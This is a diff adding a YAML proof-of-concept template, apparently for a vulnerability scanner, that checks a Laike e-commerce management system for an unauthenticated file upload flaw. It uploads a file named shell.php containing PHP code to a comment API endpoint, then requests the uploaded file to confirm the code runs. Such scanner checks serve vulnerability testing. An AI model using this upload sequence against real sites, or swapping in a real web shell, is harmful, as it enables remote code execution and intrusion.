@@ -1,0 +1,26 @@
+id: poc-yaml-Laike-E-commerce-file-upload
+info:
+  name: 来客电商管理系统文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 来客电商管理系统
+variables:
+  boundary: random_str(10)
+requests:
+- method: POST
+  path: /LKT/index.php?module=api&action=product&m=t_comment
+  headers:
+    Content-Type: multipart/form-data; boundary={{.boundary}}
+  data: "--{{.boundary}}\nContent-Disposition: form-data; name=\"imgFile\";filename=\"\
+    shell.php\"\nContent-Type:image/php\n\n<? echo md5({{.boundary}});\n--{{.boundary}}\n\
+    Content-Disposition: form-data; name=\"type\";\n\nfile \n--{{.boundary}}--\n"
+  expression: "status_code == 200 \n&& contains(body, \"\\\"status\\\":1,\\\"err\\\
+    \":\") \n&& contains(body, \"insert into lkt_comments_img\")\n&& contains(body,\
+    \ \"VALUES\")"
+  output:
+  - regex_match(body, "(?P<fname>[0-9^.]+).php")
+- method: GET
+  path: /LKT/images/{{.fname}}.php
+  expression: status_code == 200 && contains(body, md5(boundary))
+transport: http
